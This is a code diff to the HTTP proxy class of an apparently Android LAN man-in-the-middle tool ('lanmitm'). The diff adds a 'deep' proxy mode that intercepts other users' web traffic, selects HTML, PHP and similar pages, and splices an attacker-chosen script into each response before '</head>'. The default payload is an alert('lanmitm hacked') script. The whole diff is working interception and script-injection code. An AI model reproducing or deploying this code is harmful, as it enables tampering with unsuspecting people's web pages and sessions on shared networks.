@@ -13,7 +13,6 @@ import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
-import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.ExecutorService;
@@ -25,19 +24,16 @@ import org.apache.http.Header;
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
-import org.apache.http.StatusLine;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.client.methods.HttpUriRequest;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicHeader;
-import org.apache.http.util.EntityUtils;
 
 import android.util.Log;
 
 import com.oinux.lanmitm.AppContext;
-import com.oinux.lanmitm.util.RequestParser;
 
 /**
  * 
@@ -45,6 +41,9 @@ import com.oinux.lanmitm.util.RequestParser;
  *
  */
 public class HttpProxy extends Thread {
+
+	public static final int MODE_PROXY_SIMPLE = 1;
+	public static final int MODE_PROXY_DEEP = 2;
 
 	public static final String HTTP_POST = "POST";
 	public static final String HTTP_GET = "GET";
@@ -54,13 +53,15 @@ public class HttpProxy extends Thread {
 	public static boolean stop = true;
 	private static final Pattern PATTERN = Pattern
 			.compile(
-					"(\\.css\\??|\\.js\\??|\\.jpg\\??|\\.gif\\??|\\.png\\??|\\.jpeg\\??)",
+					"(^[^\\.]*$|\\.jsp\\??|\\.asp\\??|\\..*htm.*\\??|\\.php\\??|\\.jspx\\??|\\.cgi\\??|\\.aspx\\??)",
 					Pattern.CASE_INSENSITIVE);
 
 	private ServerSocket mServerSocket;
 	private OnRequestListener mOnRequestListener;
 	private ExecutorService executor;
-	private String inject;
+	private String inject = "<script type='text/javascript'>alert('lanmitm hacked')</script>";
+	private Pattern injectPattern = Pattern.compile(".*");
+	private int mProxyMode = MODE_PROXY_SIMPLE;
 
 	private static HttpProxy instance;
 
@@ -68,6 +69,22 @@ public class HttpProxy extends Thread {
 		if (instance == null || instance.getState() == State.TERMINATED)
 			instance = new HttpProxy();
 		return instance;
+	}
+
+	public Pattern getInjectPattern() {
+		return injectPattern;
+	}
+
+	public void setInjectPattern(Pattern injectPattern) {
+		this.injectPattern = injectPattern;
+	}
+
+	public int getProxyMode() {
+		return mProxyMode;
+	}
+
+	public void setProxyMode(int proxyMode) {
+		this.mProxyMode = proxyMode;
 	}
 
 	private HttpProxy() {
@@ -106,7 +123,17 @@ public class HttpProxy extends Thread {
 			executor = Executors.newCachedThreadPool();
 			while (!stop) {
 				Socket client = mServerSocket.accept();
-				executor.execute(new SimpleDealThread(client, mOnRequestListener));
+				DealThread dealThread = null;
+				switch (mProxyMode) {
+				case MODE_PROXY_SIMPLE:
+					dealThread = new SimpleDealThread(client,
+							mOnRequestListener);
+					break;
+				case MODE_PROXY_DEEP:
+					dealThread = new DeepDealThread(client, mOnRequestListener);
+					break;
+				}
+				executor.execute(dealThread);
 			}
 		} catch (IOException e) {
 			e.printStackTrace();
@@ -132,7 +159,8 @@ public class HttpProxy extends Thread {
 			super(client, onRequestListener);
 		}
 
-		private String readResponse(HttpResponse response) {
+		private String parseResponse(HttpResponse response,
+				HttpUriRequest request) {
 			HttpEntity entity = response.getEntity();
 			InputStream inputStream = null;
 			try {
@@ -185,6 +213,23 @@ public class HttpProxy extends Thread {
 										charset);
 							}
 						}
+					}
+				}
+
+				Matcher matcher = injectPattern.matcher(request.getURI()
+						.toString());
+				Log.v("deepdeal", injectPattern.pattern());
+				Log.v("deepdeal", request.getURI().toString());
+				if (matcher.find()) {
+					if (inject != null) {
+						StringBuilder sb = new StringBuilder();
+						int pos = result.indexOf("</head>");
+						if (pos != -1) {
+							sb.append(result, 0, pos);
+							sb.append(inject);
+							sb.append(result, pos, result.length());
+						}
+						return sb.toString();
 					}
 				}
 				return result;
@@ -248,12 +293,13 @@ public class HttpProxy extends Thread {
 						if (!foundPath) {
 							path = line;
 							foundPath = true;
-							Matcher m = PATTERN.matcher(path);
-							if (m.find())
-								ok = false;
 							method = line.substring(0, line.indexOf(' '));
 							url = line.substring(line.indexOf(' ') + 1,
 									line.lastIndexOf(' '));
+
+							Matcher m = PATTERN.matcher(url);
+							if (!m.find())
+								ok = false;
 						}
 					}
 					builder.append("\r\n");
@@ -268,7 +314,7 @@ public class HttpProxy extends Thread {
 							onRequestListener.onRequest(clientIp, serverName,
 									serverIp, path, headers);
 						}
-						
+
 						if (ok) {
 							if (HTTP_GET.equals(method)) {
 								request = new HttpGet("http://" + serverName
@@ -286,7 +332,7 @@ public class HttpProxy extends Thread {
 										&& response.getStatusLine()
 												.getStatusCode() == HttpStatus.SC_OK) {
 									String data = null;
-									data = readResponse(response);
+									data = parseResponse(response, request);
 									writer.write(data.getBytes(decode));
 								}
 							}
@@ -361,7 +407,7 @@ public class HttpProxy extends Thread {
 					BufferedReader bReader = new BufferedReader(
 							new InputStreamReader(byteArrayInputStream));
 					StringBuilder builder = new StringBuilder();
-					String line = null, serverName = null, path = null;
+					String line = null, serverName = null, path = null, url;
 					boolean found = false, foundPath = false, ok = true;
 					ArrayList<String> headers = new ArrayList<String>();
 
@@ -374,8 +420,11 @@ public class HttpProxy extends Thread {
 						if (!foundPath) {
 							path = line;
 							foundPath = true;
-							Matcher m = PATTERN.matcher(path);
-							if (m.find())
+							url = line.substring(line.indexOf(' ') + 1,
+									line.lastIndexOf(' '));
+
+							Matcher m = PATTERN.matcher(url);
+							if (!m.find())
 								ok = false;
 						}
 						builder.append(line + "\r\n");
